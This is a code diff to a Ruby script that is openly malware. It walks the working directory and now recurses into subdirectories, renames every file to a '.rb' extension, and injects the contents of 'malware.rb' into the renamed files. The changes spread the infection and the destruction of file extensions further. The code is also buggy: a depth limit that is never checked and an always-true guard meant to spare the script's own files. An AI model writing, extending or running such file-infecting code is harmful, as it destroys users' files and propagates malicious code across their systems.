@@ -1,27 +1,33 @@
-def find_files(files)
-    # Search all files and folders in same path with main.rb
-    for i in Dir.entries(Dir.pwd) do
-        # If element in path is equal to file add this into files array
-        if File.file?(i)
-            files.append(i)
-        end
+def find_files(files, directories, path = Dir.pwd, max_depth = 10)  # Add a max_depth limit
+    Dir.foreach(path) do |entry|
+      next if entry == '.' || entry == '..'
+  
+      full_path = File.join(path, entry)
+      if File.directory?(full_path)
+        directories << full_path
+        find_files(files, directories, full_path, max_depth - 1)  # Decrement depth
+      else
+        files << full_path
+      end
     end
-end
-
-def convert_files_to_ruby(files)
-    # Get file in files 
+  end
+  
+  def convert_files_to_ruby(files)
+    # Get file in files
     for file in files do
-        # Split file name to get extension and name of the file
-        file_name = file.split('.')
-        # Rename the original file (change extension of this file to rb)
-        File.rename(Dir.pwd + '/%s' % [file] , Dir.pwd + '/%s.rb' % [file_name[0]])
+      # Split file name to get extension and name of the file
+      file_name = file.split('.')
+      # Rename the original file (change extension of this file to rb)
+      begin
+        if file_name[0] != 'main.rb' or file_name[0] != 'Malware.rb'
+            File.rename(file, file_name[0] + '.rb')  # Use the full file path
+        end
+      rescue
+        next
+      end
     end
-
-    # Add renamed file into files
-    files.clear
-    find_files(files)
-end
-
+  end
+  
 # Inject content of malware.rb to other files
 def inject_malware_to_all_ruby_files(files, malware)
     # content of malware
@@ -44,11 +50,19 @@ def inject_malware_to_all_ruby_files(files, malware)
         next
       end
     end
-  end  
-
-# Store in 2 different arrays 
-files , directories = [] , []
-malware = Dir.pwd + '/malware.rb'
-find_files(files)
-convert_files_to_ruby(files)
-inject_malware_to_all_ruby_files(files , malware)
+end  
+  
+  files, directories = [], []
+  malware = Dir.pwd + '/malware.rb'  # Replace with a non-harmful file path
+  
+  find_files(files, directories)
+  convert_files_to_ruby(files)
+  
+  # Process files within directories
+  directories.each do |directory|
+    files_in_dir = []
+    find_files(files_in_dir, [], directory)
+    convert_files_to_ruby(files_in_dir)  # Process files within the subdirectory
+    inject_malware_to_all_ruby_files(files_in_dir, malware)
+  end
+  
